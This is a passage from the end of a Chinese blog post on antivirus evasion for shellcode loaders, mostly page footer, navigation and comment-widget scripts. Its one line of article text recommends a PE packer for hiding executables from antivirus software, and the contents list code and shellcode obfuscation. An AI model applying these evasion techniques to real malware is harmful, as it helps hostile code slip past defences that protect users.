+<p><a target="_blank" rel="noopener" href="https://github.com/czs108/PE-Packer%EF%BC%8C%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE%E5%8A%A0%E5%A3%B3%E6%95%88%E6%9E%9C%E4%B8%8D%E9%94%99%EF%BC%8C%E5%8F%AA%E5%8F%AF%E6%83%9C%E4%B9%9F%E8%A2%AB%E6%9D%80%E8%BD%AF%E6%A0%87%E8%AE%B0%E4%BA%86%E3%80%82%E8%BD%AF%E4%BB%B6%E5%8A%A0%E5%A3%B3%E6%AF%94%E8%B5%B7%E6%BA%90%E7%A0%81%E6%B7%B7%E6%B7%86%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%AF%B4%E6%98%AF%E4%B8%80%E5%8A%B3%E6%B0%B8%E9%80%B8%E3%80%82%E4%BD%86%E8%A6%81%E7%86%9F%E7%BB%83%E6%8E%8C%E6%8F%A1PE%E7%BB%93%E6%9E%84%E5%92%8C%E6%B1%87%E7%BC%96%E6%89%8D%E8%83%BD%E5%AE%8C%E6%88%90%E3%80%82">https://github.com/czs108/PE-Packer，这个项目加壳效果不错，只可惜也被杀软标记了。软件加壳比起源码混淆，可以说是一劳永逸。但要熟练掌握PE结构和汇编才能完成。</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">LuckyFuture</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://luckyfuture.top/BypassAVLearning5.html">http://luckyfuture.top/BypassAVLearning5.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/%E7%9F%A5%E8%AF%86%E5%85%B1%E4%BA%AB%E8%AE%B8%E5%8F%AF%E5%8D%8F%E8%AE%AE" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://luckyfuture.top" target="_blank">Lucky Future的技术栈</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220330225031462.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/CandCpp-DynamicStorage.html"><img class="prev-cover" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220408212609612.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">C语言动态内存分配</div></div></a></div><div class="next-post pull-right"><a href="/BypassAVLearning4.html"><img class="next-cover" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220328215223222.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">从0开始写ShellCode加载器0x4-隐藏导入表</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Waline</span><span class="switch-btn"></span><span class="second-comment">Disqusjs</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86"><span class="toc-number">1.</span> <span class="toc-text">代码混淆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode%E6%B7%B7%E6%B7%86"><span class="toc-number">2.</span> <span class="toc-text">shellcode混淆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AF%E4%BB%B6%E5%8A%A0%E5%A3%B3"><span class="toc-number">3.</span> <span class="toc-text">软件加壳</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220330225031462.png)"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2025 By LuckyFuture</div><div class="framework-info"><span>Powered by </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">本站部署在<a target="_blank" rel="noopener" href="https://pages.github.com/">GitHub Pages</a>，由<a target="_blank" rel="noopener" href="https://www.jsdelivr.com/">jsDelivr</a>和<a target="_blank" rel="noopener" href="https://www.cloudflare.com/zh-cn/">CloudFlare</a>提供CDN加速和安全防护</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadWaline () {
+  function initWaline () {
+    let initData = {
+      el: '#waline-wrap',
+      serverURL: 'https://hexo-comments.vercel.app/',
+      avatar: 'mp',
+      path: location.pathname,
+      emojiCDN: '',
+      emojiMaps: "",
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign(initData, otherData)
+    }
+    
+    const waline = new Waline(initData)
+  }
+
+  if (typeof Waline === 'function') initWaline() 
+  else getScript('https://cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js').then(initWaline)
+}
+
+if ('Waline' === 'Waline' || !false) {
+  if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+  else setTimeout(loadWaline, 0)
+} else {
+  function loadOtherComment () {
+    loadWaline()
+  }
+}</script><script>function loadDisqusjs () {
+  function addDisqusjsCSS () {
+    const ele = document.createElement('link')
+    ele.rel = 'stylesheet'
+    ele.href= 'https://cdn.jsdelivr.net/npm/disqusjs@1/dist/disqusjs.css'
+    document.getElementsByTagName('head')[0].appendChild(ele)
+  }
+
+  function initDisqusjs () {
+    window.DISQUS = null
+    new DisqusJS({
+      shortname: 'luckyfuture',
+      siteName: '',
+      identifier: 'BypassAVLearning5.html',
+      url: 'http://luckyfuture.top/BypassAVLearning5.html',
+      title: '从0开始写ShellCode加载器0x5-代码混淆',
+      api: 'https://disqus.skk.moe/disqus/',
+      apikey: 'zkchdXXUQFql5yBCEoFFYVoGrCrqnkDmWuirRxGPu6qmzj0i8lHYLa2HiWNus9DQ',
+      nocomment: '',
+      admin: 'LuckyFuture',
+      adminLabel: ''
+    });
+  }
+
+  window.disqusReset = initDisqusjs
+
+  if (window.disqusJsLoad) initDisqusjs()
+  else {
+    addDisqusjsCSS()
+    getScript('https://cdn.jsdelivr.net/npm/disqusjs@1/dist/disqus.js').then(initDisqusjs)
+    window.disqusJsLoad = true
+  }
+}
+
+if ('Waline' === 'Disqusjs' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqusjs)
+  else loadDisqusjs()
+}
+else {
+  function loadOtherComment () {
+    loadDisqusjs()
+  }
+}
+
+</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script></div></body></html>
